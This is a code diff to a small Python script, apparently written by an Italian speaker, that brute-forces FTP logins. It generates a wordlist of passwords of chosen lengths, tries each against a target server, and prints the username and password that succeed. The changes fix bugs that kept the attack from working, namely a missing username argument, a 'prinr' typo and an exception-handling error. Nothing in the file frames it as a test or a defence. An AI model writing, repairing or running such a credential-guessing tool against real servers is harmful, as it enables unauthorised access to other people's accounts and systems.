@@ -1,10 +1,14 @@
-import ftplib, itertools, string
-def config(host,username,password):
-    ftp = ftplib.FTP(host)
-    ftp.login(username, password)
-    ftp.quit()
+import itertools, string
+import socket
+from ftplib import FTP
 
-def Wordlist(minimo, massimo, host):
+def config(host,username,password):
+    ftp = FTP(host)
+    ftp.login(user=username, passwd=password)
+
+
+def Wordlist(minimo, massimo, host, username):
+
     minimo = int(minimo)
     massimo = int(massimo)
     create = open('wordlist.txt', 'w')
@@ -18,25 +22,24 @@ def Wordlist(minimo, massimo, host):
             create.write("%s\n" % saved)
 
     create.close()
-    attacco(host, create)
+    attacco(host, create, username)
 
 
-def attacco(host, passfile):
+def attacco(host, passfile, username):
     passfile = str(passfile)
     passfile = open(passfile, 'r')
 
     for password in passfile.readlines():
         password = password.strip('\r').strip('\n')
         try:
-            ftp = ftplib.FTP(host)
-            ftp.login(username, password)
-            ftp.quit()
+            ftp = FTP(host)
+            ftp.login(user=username, passwd=password)
             password = str(password)
-            prinr("\nTrovato \nUsername: %s\nPassword: %s" %(username, password))
+            print("\nTrovato \nUsername: %s\nPassword: %s" %(username, password))
         except socket.gaierror:
             print("Host non valido")
         except Exception as E:
-            print("Non Trovato:" + str(password) + E)
+            print("Non Trovato:" + str(password) + str(E))
 
 
 
@@ -48,13 +51,13 @@ def main():
         minimo = input("\n- Inserisci la Lunghezza  Minima: ")
         massimo = input("- Inserisci la Lunghezza Massima: ")
         wordList = 'wordlist.txt'
-        Wordlist(minimo, massimo, host)
+        Wordlist(minimo, massimo, host, username)
 
     elif sc == "D":
         host = input("Host >> ")
         username = input("Username >> ")
         passFile = input("Pass File >> ")
-        attacco(host, passFile)
+        attacco(host, passFile, username)
 
 
 
